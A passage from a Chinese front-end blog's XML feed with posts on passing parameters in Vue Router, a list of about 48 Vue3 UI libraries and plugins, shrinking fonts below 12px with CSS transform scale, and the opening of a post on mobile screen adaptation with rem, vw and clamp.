<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 列表中的传参</span></span><br><span class="line"><span class="title function_">goDetail</span>(<span class="params">row</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">$router</span>.<span class="title function_">push</span>(&#123;</span><br><span class="line">        <span class="attr">path</span>: <span class="string">`/detail/<span class="subst">$&#123;row.id&#125;</span>`</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 详情页获取参数</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">$route</span>.<span class="property">params</span>.<span class="property">id</span></span><br></pre></td></tr></table></figure>

<p>通过 $router.push 的 params 传参</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 列表页传参</span></span><br><span class="line"><span class="title function_">goDetail</span>(<span class="params">row</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">$router</span>.<span class="title function_">push</span>(&#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&#x27;detail&#x27;</span>,</span><br><span class="line">        <span class="attr">params</span>: &#123;</span><br><span class="line">            <span class="attr">id</span>: row.<span class="property">id</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 详情页获取</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">$route</span>.<span class="property">params</span>.<span class="property">id</span></span><br></pre></td></tr></table></figure>

<h3 id="使用-query"><a href="#使用-query" class="headerlink" title="使用 query"></a>使用 query</h3><p>适用多个参数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 路由配置</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/detail&#x27;</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;detail&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>: <span class="title class_">Detail</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 列表页</span></span><br><span class="line"><span class="title function_">goDetail</span>(<span class="params">row</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">$router</span>.<span class="title function_">push</span>(&#123;</span><br><span class="line">        <span class="attr">path</span>: <span class="string">&#x27;/detail&#x27;</span>,</span><br><span class="line">        <span class="attr">query</span>: &#123;</span><br><span class="line">            <span class="attr">id</span>: row.<span class="property">id</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 详情页</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">$route</span>.<span class="property">query</span>.<span class="property">id</span></span><br></pre></td></tr></table></figure>

<p>注意：在所有的子组件中获取路由参数是 $route 不是 $router</p>
<p>params 与 query 区别</p>
<p>当使用 params 方法传参的时候，要在路由后面加参数名，成为路由的一部分，并且传参的时候，参数名要跟路由后面设置的参数名对应。使用 query 方法，就没有这种限制，直接在跳转里面用就可以，另外 query 是拼接在 url 后面的参数，没有也没关系。</p>
<h3 id="使用-props-配合组件路由解耦"><a href="#使用-props-配合组件路由解耦" class="headerlink" title="使用 props 配合组件路由解耦"></a>使用 props 配合组件路由解耦</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 路由配置</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/detail/:id&#x27;</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;detail&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>: <span class="title class_">Detail</span>,</span><br><span class="line">    <span class="attr">props</span>: <span class="literal">true</span> <span class="comment">// 如果props设置为true，$route.params将被设置为组件属性</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 列表页</span></span><br><span class="line"><span class="title function_">goDetail</span>(<span class="params">row</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">$router</span>.<span class="title function_">push</span>(&#123;</span><br><span class="line">        <span class="attr">path</span>: <span class="string">&#x27;/detail&#x27;</span>,</span><br><span class="line">        <span class="attr">query</span>: &#123;</span><br><span class="line">            <span class="attr">id</span>: row.<span class="property">id</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 详情页</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    <span class="attr">props</span>: &#123;</span><br><span class="line">        <span class="comment">// 将路由中传递的参数id解耦到组件的props属性上</span></span><br><span class="line">        <span class="attr">id</span>: <span class="title class_">String</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">mounted</span>: &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">id</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1] <a href="https://router.vuejs.org/zh/guide/essentials/navigation.html#%E7%BC%96%E7%A8%8B%E5%BC%8F%E5%AF%BC%E8%88%AA">编程式导航</a></p>
]]></content>
      <categories>
        <category>工作点滴</category>
      </categories>
      <tags>
        <tag>Vue</tag>
        <tag>Vuex</tag>
        <tag>Vue Router</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue3生态圈</title>
    <url>/2022/10/19/20221019-Vue3%E7%94%9F%E6%80%81%E5%9C%88/</url>
    <content><![CDATA[<p>你对 Vue3 的生态和工具都了解吗，比如有哪些网页 UI 库，有哪些移动 UI 库，有哪些插件，有哪些动画插件，有哪些可视化工具？如果不了解，你就不知道 Vue3 的世界有多精彩！</p>
<p><img src="https://cdn.huatree.top/image-20221019101300848.png" alt="image-20221019101300848"></p>
<span id="more"></span>

<h2 id="Web-UI-库"><a href="#Web-UI-库" class="headerlink" title="Web UI 库"></a>Web UI 库</h2><h3 id="1-ElementUI-Plus"><a href="#1-ElementUI-Plus" class="headerlink" title="1. ElementUI Plus"></a>1. ElementUI Plus</h3><p>一套为开发者、设计师和产品经理准备的基于 Vue 3.0 的桌面端组件库</p>
<p><a href="https://element-plus.org/zh-CN/">https://element-plus.org/zh-CN/</a></p>
<h3 id="2-Ant-Design-of-Vue"><a href="#2-Ant-Design-of-Vue" class="headerlink" title="2. Ant Design of Vue"></a>2. Ant Design of Vue</h3><p>Ant Design 的 Vue 实现，开发和服务于企业级后台产品</p>
<p><a href="https://www.antdv.com/docs/vue/introduce-cn">https://www.antdv.com/docs/vue/introduce-cn</a></p>
<h3 id="3-BalmUI"><a href="#3-BalmUI" class="headerlink" title="3. BalmUI"></a>3. BalmUI</h3><p>基于谷歌的 Material Design，附带 Vue 插件和指令，以及从简单到复杂的高度可定制组件</p>
<p><a href="https://next-material.balmjs.com/">https://next-material.balmjs.com/</a></p>
<h3 id="4-Naive-UI"><a href="#4-Naive-UI" class="headerlink" title="4. Naive UI"></a>4. Naive UI</h3><p>图森 Vue3 的组件库，文档完整，我项目中经常使用</p>
<p><a href="https://www.naiveui.com/zh-CN/os-theme">https://www.naiveui.com/zh-CN/os-theme</a></p>
<h3 id="5-arco-design"><a href="#5-arco-design" class="headerlink" title="5. arco.design"></a>5. arco.design</h3><p>字节跳动企业级产品设计系统，支持 React 和 Vue 双版本</p>
<p><a href="https://arco.design/">https://arco.design/</a></p>
<h3 id="6-Quasar"><a href="#6-Quasar" class="headerlink" title="6, Quasar"></a>6, Quasar</h3><p>轻松构建高性能和高质量的 Vue.js 3 用户界面，好用，但没有中文文档</p>
<p><a href="https://quasar.dev/">https://quasar.dev/</a></p>
<h3 id="7-iDUX"><a href="#7-iDUX" class="headerlink" title="7. iDUX"></a>7. iDUX</h3><p>Vue3.x 的 UI 组件库，完全使用 TypeScript 开发</p>
<p><a href="https://idux.site/">https://idux.site/</a></p>
<h3 id="8-TDesign"><a href="#8-TDesign" class="headerlink" title="8. TDesign"></a>8. TDesign</h3><p>腾讯业务团队在服务业务过程中沉淀的一套企业级设计体系</p>
<p><a href="https://tdesign.tencent.com/">https://tdesign.tencent.com/</a></p>
<p><a href="https://tdesign.tencent.com/vue-next/overview">https://tdesign.tencent.com/vue-next/overview</a></p>
<h3 id="9-PrimeVue"><a href="#9-PrimeVue" class="headerlink" title="9. PrimeVue"></a>9. PrimeVue</h3><p>易于使用、多功能、高性能的 Vue UI 组件库</p>
<p><a href="https://www.primefaces.org/primevue/">https://www.primefaces.org/primevue/</a></p>
<h3 id="10-DevUI"><a href="#10-DevUI" class="headerlink" title="10. DevUI"></a>10. DevUI</h3><p>华为基于 Vue3 和 DevUI 设计的 UI 组件</p>
<p><a href="https://vue-devui.github.io/">https://vue-devui.github.io/</a></p>
<h3 id="11-vuestic-ui"><a href="#11-vuestic-ui" class="headerlink" title="11. vuestic-ui"></a>11. vuestic-ui</h3><p>Vue 3 的免费和开源 UI 库 ,UI 非常好看，并且有可用后台管理界面。</p>
<p><a href="https://vuestic.dev/">https://vuestic.dev/</a></p>
<h3 id="12-Headless-UI"><a href="#12-Headless-UI" class="headerlink" title="12. Headless UI"></a>12. Headless UI</h3><p>完全无样式、完全可访问的 UI 组件，旨在与 Tailwind CSS 完美集成。</p>
<p><a href="https://headlessui.com/">https://headlessui.com/</a></p>
<h3 id="13-View-UI-Plus"><a href="#13-View-UI-Plus" class="headerlink" title="13. View UI Plus"></a>13. View UI Plus</h3><p>基于 Vue.js 3 的企业级 UI 组件库和前端解决方案</p>
<p><a href="https://www.iviewui.com/">https://www.iviewui.com/</a></p>
<h2 id="移动-UI-库"><a href="#移动-UI-库" class="headerlink" title="移动 UI 库"></a>移动 UI 库</h2><h3 id="14-Vant"><a href="#14-Vant" class="headerlink" title="14. Vant"></a>14. Vant</h3><p>有赞轻量、可靠的移动端组件库</p>
<p><a href="https://vant-contrib.gitee.io/vant/#/zh-CN">https://vant-contrib.gitee.io/vant/#/zh-CN</a></p>
<h3 id="15-NutUI"><a href="#15-NutUI" class="headerlink" title="15. NutUI"></a>15. NutUI</h3><p>京东风格的轻量级移动端 Vue 组件库，非常适合移动端电商使用。</p>
<p><a href="https://nutui.jd.com/#/">https://nutui.jd.com/#/</a></p>
<h3 id="16-Varlet"><a href="#16-Varlet" class="headerlink" title="16. Varlet"></a>16. Varlet</h3><p>Material 风格移动端组件库 ，文档非常齐全。</p>
<p><a href="https://varlet.gitee.io/varlet-ui/#/zh-CN/home">https://varlet.gitee.io/varlet-ui/#/zh-CN/home</a></p>
<h3 id="17-nutui-bingo"><a href="#17-nutui-bingo" class="headerlink" title="17. nutui-bingo"></a>17. nutui-bingo</h3><p>京东基于 NutUI 的抽奖组件库，助力营销活动和小游戏场景。</p>
<p><a href="https://nutui.jd.com/bingo/#/">https://nutui.jd.com/bingo/#/</a></p>
<h2 id="相关工具"><a href="#相关工具" class="headerlink" title="相关工具"></a>相关工具</h2><h3 id="18-unplugin-vue-components"><a href="#18-unplugin-vue-components" class="headerlink" title="18. unplugin-vue-components"></a>18. unplugin-vue-components</h3><p>antfu 按需组件自动导入，开箱即用地支持 Vue 2 和 Vue 3，Tree-shakable，只注册你使用的组件，附有流行 UI 库的内置解析器。</p>
<p><a href="https://www.npmjs.com/package/unplugin-vue-components">https://www.npmjs.com/package/unplugin-vue-components</a></p>
<h3 id="19-vuex-persistedstate"><a href="#19-vuex-persistedstate" class="headerlink" title="19. vuex-persistedstate"></a>19. vuex-persistedstate</h3><p>在页面重新加载之间保持并重载您的 Vuex 状态</p>
<p><a href="https://github.com/robinvdvleuten/vuex-persistedstate">https://github.com/robinvdvleuten/vuex-persistedstate</a></p>
<h3 id="20-vuex-persist"><a href="#20-vuex-persist" class="headerlink" title="20. vuex-persist"></a>20. vuex-persist</h3><p>支持 Typescript 的 Vuex 插件，它能够将应用程序的状态保存到持久存储中，例如 Cookies 或 localStorage</p>
<p><a href="https://championswimmer.in/vuex-persist/">https://championswimmer.in/vuex-persist/</a></p>
<h3 id="21-vueuse-x2F-gesture"><a href="#21-vueuse-x2F-gesture" class="headerlink" title="21. @vueuse&#x2F;gesture"></a>21. @vueuse&#x2F;gesture</h3><p>手势库，使应用程序具有交互性</p>
<p><a href="https://gesture.vueuse.org/">https://gesture.vueuse.org/</a></p>
<h3 id="22-unplugin-auto-import"><a href="#22-unplugin-auto-import" class="headerlink" title="22. unplugin-auto-import"></a>22. unplugin-auto-import</h3><p>antfu 自动导入 Vite、Webpack、Rollup 和 esbuild 的 API。支持 TypeScript。</p>
<p><a href="https://github.com/antfu/unplugin-auto-import">https://github.com/antfu/unplugin-auto-import</a></p>
<h3 id="23-pinia-plugin-persistedstate"><a href="#23-pinia-plugin-persistedstate" class="headerlink" title="23. pinia-plugin-persistedstate"></a>23. pinia-plugin-persistedstate</h3><p>Pinia 商店的可配置持久性</p>
<p><a href="https://github.com/prazdevs/pinia-plugin-persistedstate">https://github.com/prazdevs/pinia-plugin-persistedstate</a></p>
<h3 id="24-vue-termui"><a href="#24-vue-termui" class="headerlink" title="24. vue-termui"></a>24. vue-termui</h3><p>一个基于 Vue.js 的终端 UI 框架，可让您轻松构建现代终端应用程序</p>
<p><a href="https://vue-termui.dev/">https://vue-termui.dev/</a></p>
<h3 id="25-Vite"><a href="#25-Vite" class="headerlink" title="25. Vite"></a>25. Vite</h3><p>下一代前端开发与构建工具</p>
<p><a href="https://vitejs.cn/">https://vitejs.cn/</a></p>
<h2 id="可视化"><a href="#可视化" class="headerlink" title="可视化"></a>可视化</h2><h3 id="26-Pdfvuer"><a href="#26-Pdfvuer" class="headerlink" title="26. Pdfvuer"></a>26. Pdfvuer</h3><p>DF 查看器，使用 Mozilla 的 PDF.js，支持 Vue2 和 Vue3</p>
<p><a href="https://arkokoley.github.io/pdfvuer/">https://arkokoley.github.io/pdfvuer/</a></p>
<h3 id="27-vue3-marquee"><a href="#27-vue3-marquee" class="headerlink" title="27. vue3-marquee"></a>27. vue3-marquee</h3><p>无缝滚动组件</p>
<p><a href="https://vue3-marquee.vercel.app/">https://vue3-marquee.vercel.app/</a></p>
<h3 id="28-Vue-ECharts"><a href="#28-Vue-ECharts" class="headerlink" title="28. Vue-ECharts"></a>28. Vue-ECharts</h3><p>百度 ECharts 的 Vue.js 组件。 配置参考 Echarts 官方 基于 ECharts v5+ 开发，适用于 Vue.js 2&#x2F;3。</p>
<p><a href="https://vue-echarts.dev/">https://vue-echarts.dev/</a></p>
<h3 id="29-iconpark"><a href="#29-iconpark" class="headerlink" title="29. iconpark"></a>29. iconpark</h3><p>字节跳动出品，将一个 SVG 图标转化为多个主题，并生成 React 图标，Vue 图标，svg 图标</p>
<p><a href="https://iconpark.oceanengine.com/home">https://iconpark.oceanengine.com/home</a></p>
<h2 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h2><h3 id="30-vue-multiselect-next"><a href="#30-vue-multiselect-next" class="headerlink" title="30. vue-multiselect-next"></a>30. vue-multiselect-next</h3><p>Vue.js 的通用选择&#x2F;多选&#x2F;标记组件</p>
<p><a href="https://vue-multiselect.js.org/">https://vue-multiselect.js.org/</a></p>
<h3 id="31-vue-print-nb"><a href="#31-vue-print-nb" class="headerlink" title="31. vue-print-nb"></a>31. vue-print-nb</h3><p>用于印刷、简单、快速、方便、轻便的指令包装器</p>
<p><a href="https://github.com/Power-kxLee/vue-print-nb">https://github.com/Power-kxLee/vue-print-nb</a></p>
<h3 id="32-vue-i18n-next"><a href="#32-vue-i18n-next" class="headerlink" title="32. vue-i18n-next"></a>32. vue-i18n-next</h3><p>Vue3 的国际化插件</p>
<p><a href="https://vue-i18n.intlify.dev/">https://vue-i18n.intlify.dev/</a></p>
<h3 id="33-vue-cropper"><a href="#33-vue-cropper" class="headerlink" title="33. vue-cropper"></a>33. vue-cropper</h3><p>简单的 vue 图片裁剪插件</p>
<p><a href="http://github.xyxiao.cn/vue-cropper/example/">http://github.xyxiao.cn/vue-cropper/example/</a></p>
<h3 id="34-Vue-Grid-Layout"><a href="#34-Vue-Grid-Layout" class="headerlink" title="34. Vue Grid Layout"></a>34. Vue Grid Layout</h3><p>Vue.js 的网格布局系统</p>
<p><a href="https://jbaysolutions.github.io/">https://jbaysolutions.github.io/</a></p>
<h3 id="35-Vue-Qrcode-Reader"><a href="#35-Vue-Qrcode-Reader" class="headerlink" title="35. Vue Qrcode Reader"></a>35. Vue Qrcode Reader</h3><p>允许在不离开浏览器的情况下检测和解码二维码</p>
<p><a href="https://gruhn.github.io/vue-qrcode-reader/">https://gruhn.github.io/vue-qrcode-reader/</a></p>
<h3 id="36-Makeit-Captcha"><a href="#36-Makeit-Captcha" class="headerlink" title="36. Makeit Captcha"></a>36. Makeit Captcha</h3><p>基于 Vue3 + Vite + Canvas 开发的滑块验证码，动态生成验证滑块，结合后端的二次校验，能有效的避免被抓取模拟验证</p>
<p><a href="https://admin.makeit.vip/components/captcha">https://admin.makeit.vip/components/captcha</a></p>
<h3 id="37-vue3-clipboard"><a href="#37-vue3-clipboard" class="headerlink" title="37. vue3-clipboard"></a>37. vue3-clipboard</h3><p>Vue 3 的 clipboard.js</p>
<p><a href="https://github.com/soerenmartius/vue3-clipboard">https://github.com/soerenmartius/vue3-clipboard</a></p>
<h3 id="38-vue-draggable"><a href="#38-vue-draggable" class="headerlink" title="38. vue.draggable"></a>38. vue.draggable</h3><p>基于 Sortable.js 的 Vue 3 拖放组件</p>
<p><a href="https://sortablejs.github.io/vue.draggable.next/#/simple">https://sortablejs.github.io/vue.draggable.next/#/simple</a></p>
<h3 id="39-BetterScroll"><a href="#39-BetterScroll" class="headerlink" title="39. BetterScroll"></a>39. BetterScroll</h3><p>解决移动端（已支持 PC）各种滚动场景需求的插件。</p>
<p><a href="https://better-scroll.github.io/docs/zh-CN/">https://better-scroll.github.io/docs/zh-CN/</a></p>
<h2 id="相关生态"><a href="#相关生态" class="headerlink" title="相关生态"></a>相关生态</h2><h3 id="40-Vue-插件库"><a href="#40-Vue-插件库" class="headerlink" title="40. Vue 插件库"></a>40. Vue 插件库</h3><p><a href="https://www.vue365.cn/">https://www.vue365.cn/</a></p>
<h3 id="41-Pinia"><a href="#41-Pinia" class="headerlink" title="41. Pinia"></a>41. Pinia</h3><p>轻量级状态管理库，API 设计更接近 Vuex 5 的提案</p>
<p><a href="https://pinia.vuejs.org/">https://pinia.vuejs.org/</a></p>
<h3 id="42-Nuxt-Modules"><a href="#42-Nuxt-Modules" class="headerlink" title="42. Nuxt Modules"></a>42. Nuxt Modules</h3><p>Nuxt 发现我们的模块列表以增强您的 Nuxt 项目</p>
<p><a href="https://modules.nuxtjs.org/">https://modules.nuxtjs.org/</a></p>
<h3 id="43-Nuxt-3"><a href="#43-Nuxt-3" class="headerlink" title="43. Nuxt 3"></a>43. Nuxt 3</h3><p>轻量级应用框架,可用来创建服务端渲染 (SSR) 应用</p>
<p><a href="https://v3.nuxtjs.org/">https://v3.nuxtjs.org/</a></p>
<h3 id="44-vuepress"><a href="#44-vuepress" class="headerlink" title="44. vuepress"></a>44. vuepress</h3><p>Vue 驱动的静态网站生成器</p>
<p><a href="https://v2.vuepress.vuejs.org/zh/">https://v2.vuepress.vuejs.org/zh/</a></p>
<h3 id="45-VueUse"><a href="#45-VueUse" class="headerlink" title="45. VueUse"></a>45. VueUse</h3><p>强大的 Vue 组合实用程序集合</p>
<p><a href="https://vueuse.org/">https://vueuse.org/</a></p>
<h2 id="动画"><a href="#动画" class="headerlink" title="动画"></a>动画</h2><h3 id="46-vue-starport"><a href="#46-vue-starport" class="headerlink" title="46. vue-starport"></a>46. vue-starport</h3><p>带有动画的跨路由共享组件</p>
<p><a href="https://vue-starport.netlify.app/">https://vue-starport.netlify.app/</a></p>
<h3 id="47-vueuse-x2F-motion"><a href="#47-vueuse-x2F-motion" class="headerlink" title="47. @vueuse&#x2F;motion"></a>47. @vueuse&#x2F;motion</h3><p>Vue Composables 让你的组件动起来</p>
<p><a href="https://motion.vueuse.org/">https://motion.vueuse.org/</a></p>
<h2 id="音视频"><a href="#音视频" class="headerlink" title="音视频"></a>音视频</h2><h3 id="48-vueuse-x2F-sound"><a href="#48-vueuse-x2F-sound" class="headerlink" title="48. @vueuse&#x2F;sound"></a>48. @vueuse&#x2F;sound</h3><p>用于播放音效的 Vue 组合</p>
<p><a href="https://sound.vueuse.org/">https://sound.vueuse.org/</a></p>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1] <a href="https://mp.weixin.qq.com/s?__biz=Mzg4NzU5NzY4MQ==&mid=2247486647&idx=1&sn=6ef0b8be4316d3ee553e44f2d4157a25&chksm=cf86b3a9f8f13abf1ed0dd40bb4ff3af1a61fa470f8a80e83cfd208f99b4b78f6bc0e0ba35b0&mpshare=1&scene=24&srcid=1013yhYPWHhRHRYVr90cw2nW&sharer_sharetime=1665633221265&sharer_shareid=ee63f9cc3c108d8b07d5b171a48e9891#rd">前端老司机 40+ Vue3 实用工具分享</a></p>
]]></content>
      <categories>
        <category>成长经历</category>
      </categories>
      <tags>
        <tag>Vue3</tag>
      </tags>
  </entry>
  <entry>
    <title>字体小于12px解决方案</title>
    <url>/2022/08/04/20221108-%E5%AD%97%E4%BD%93%E5%B0%8F%E4%BA%8E12px%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
    <content><![CDATA[<p>以往设计图给的字号一般最小就是 12px， 开发人员一般是使用谷歌浏览器来进行调试运行。<br>谷歌浏览器上显示字体最小为 12px，css 设置 font-size：10px，运行代码显示结果仍然是 12px 大小，但是挡不住甲方有时就是强调使用的字号，必须是特别小的字号，就比如说某些网站设计的噱头–“买房送老婆”，但其实你不知道的是，在“老婆”两个字之后，还有一个小到你需要用放大镜去看的“饼”字，就问你惊不惊喜，意不意外？</p>
<span id="more"></span>

<h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p><code>transform:scale()</code>，使用广泛。</p>
<p>优点：单行、多行文本都可使用</p>
<p>缺点：只是视觉效果变小，并不会改变盒子的实际占位，在对齐其他盒子时不太友好</p>
<p>示例：购物车图标</p>
<ul>
<li>可以先将整个盒子的尺寸属性都放大 2 倍，再利用<code>scale(.5)</code>缩小为原来的一半。这里可以同时解决<code>.5px border</code>的问题</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">  <span class="selector-class">.cart</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">height</span>: <span class="number">40px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">line-height</span>: <span class="number">40px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">font-size</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">    -webkit-<span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">0.5</span>);</span></span><br><span class="line"><span class="language-css">    <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">0.5</span>);</span></span><br><span class="line"><span class="language-css">    -webkit-<span class="attribute">transform-origin</span>: <span class="number">100%</span> <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">transform-origin</span>: <span class="number">100%</span> <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;cart&quot;</span>&gt;</span>...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>红点盒子内是字体盒子，字体盒子缩小一半</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">  <span class="selector-class">.cartDot</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">height</span>: <span class="number">0.75rem</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">min-width</span>: <span class="number">0.75rem</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">border-radius</span>: <span class="number">0.375rem</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">background</span>: red;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">color</span>: white;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">line-height</span>: <span class="number">0.75rem</span>;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css">  <span class="selector-class">.num</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">font-size</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">    -webkit-<span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">0.5</span>);</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;cartDot&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;num&quot;</span>&gt;</span>99<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1] <a href="https://blog.csdn.net/qq_43687594/article/details/124479693">设置浏览器显示小于 12px 以下字体的三种方法</a></p>
]]></content>
      <categories>
        <category>工作点滴</category>
      </categories>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title>移动端适配解决方案</title>
    <url>/2022/11/12/20221112-%E7%A7%BB%E5%8A%A8%E7%AB%AF%E9%80%82%E9%85%8D%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
    <content><![CDATA[<p>“移动H5”几个字的量，必知必会的自适应方案与高清方案。</p>
<p><img src="https://cdn.huatree.top/image-20221112200231090.png" alt="image-20221112200231090"></p>
<span id="more"></span>

<p>”自适应“讲的是一套UI（例如750*1334），在多端下展示近乎一样的效果；而”高清“是因为 DPR 提升而所做的各种精度适配。</p>
<h2 id="先说结论"><a href="#先说结论" class="headerlink" title="先说结论"></a>先说结论</h2><p><strong>自适应方案</strong></p>
<p><code>rem</code></p>
<ul>
<li><p>适配思路</p>
<ul>
<li><p>选择一个尺寸作为设计和开发基准</p>
</li>
<li><p>定义一套适配规则，自动适配剩余的尺寸</p>
</li>
<li><p>特殊适配效果给出设计效果</p>
</li>
<li><p>属于<strong>历史产物</strong>，CSS 视窗单位未得到主流浏览器的支持</p>
</li>
</ul>
</li>
<li><p>原理</p>
<ul>
<li>根据视窗宽度动态调整根元素 html 的 font-size 的值</li>
<li>把总宽度设置为 100 份，每一份被称为一个单位 x，同时设置 <code>1rem</code> 单位为 <code>10x</code></li>
</ul>
</li>
<li><p>缺点</p>
<ul>
<li><p>需要加载 js 脚本，而且根据设备的视窗宽度进行计算，影响性能</p>
</li>
<li><p>影响力：从2015年出世至今，在 H5 适配领域占据一定比例</p>
</li>
<li><p>相关技术库：**<a href="https://github.com/amfe/lib-flexible">flexible</a><strong>、</strong><a href="https://github.com/songsiqi/px2rem">px2rem</a>**</p>
</li>
</ul>
</li>
</ul>
<p><code>vw</code></p>
<ul>
<li><p>适配思路（如上）</p>
</li>
<li><p>原理</p>
<ul>
<li>利用 CSS 视窗的特性，总宽度为 <code>100vw</code>，每一份为一个单位 <code>1vw</code>，设置 <code>1rem</code> 单位为 <code>10vw</code></li>
</ul>
</li>
<li><p>缺点</p>
<ul>
<li>因为是根据视图的宽度计算，所以不适用平板和PC</li>
</ul>
</li>
<li><p>影响力：2018年出的方案，目前 H5 适配主流</p>
</li>
<li><p>相关技术库：**<a href="https://github.com/evrone/postcss-px-to-viewport">postcss-px-to-viewport</a>**</p>
</li>
</ul>
<p><code>px + calc + clamp</code></p>
<ul>
<li><p>适配思路</p>
<ul>
<li>根据 CSS 的新特性：css变量、calc()函数、clamp()、@container函数实现</li>
</ul>
</li>
<li><p>特点</p>
<ul>
<li>解决了rem、vw布局的致命缺点：<strong>失去像素的完美性，而且一旦屏幕低于或高于某个阈值，通常就会出现布局的移动或文字内容的溢出</strong></li>
<li>大漠在2021年提出，最先进，但没看到大厂使用（<a href="https://www.zhihu.com/search?q=clamp%E5%87%BD%E6%95%B0&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:2439525582%7D">clamp函数</a>浏览器支持率暂且不高），具体可以看看大漠的这篇：**<a href="https://www.w3cplus.com/css/how-to-get-a-pixel-perfect-and-linearly-scaled-ui.html">如何构建一个完美缩放的UI界面</a>**</li>
</ul>
</li>
<li><p>缺点</p>
<ul>
<li>因为方案先进，暂没看到大厂使用</li>
</ul>
</li>
</ul>
<p><strong>高清方案</strong></p>
<ul>
<li>1 像素问题的解决方案</li>
<li>不同 DPR 下图片的高清解决方案</li>
</ul>
<p>综上，自适应方案是解决<strong>各终端的适配问题</strong>，高清方案是解决<strong>Retina屏的细节处理</strong></p>
<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>在说移动端适配方案之前先整明白一些技术概念</p>
